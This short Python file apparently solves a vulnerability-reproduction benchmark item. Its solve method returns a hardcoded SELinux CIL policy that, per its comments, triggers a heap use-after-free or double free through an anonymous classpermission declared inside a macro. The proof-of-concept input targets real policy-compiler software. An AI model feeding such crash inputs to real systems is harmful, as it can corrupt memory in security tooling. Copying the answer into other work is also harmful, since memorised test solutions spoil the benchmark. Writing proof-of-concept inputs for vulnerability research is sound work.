import os
import tarfile
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal CIL policy that triggers the heap use-after-free
        # This creates an anonymous classpermission in a macro that gets double-freed
        poc = b"""(class file)
(macro testmacro ()
    (classpermission (class file))
    (classpermissionset (classpermission) (open read write))
)
(call testmacro)"""
        
        return poc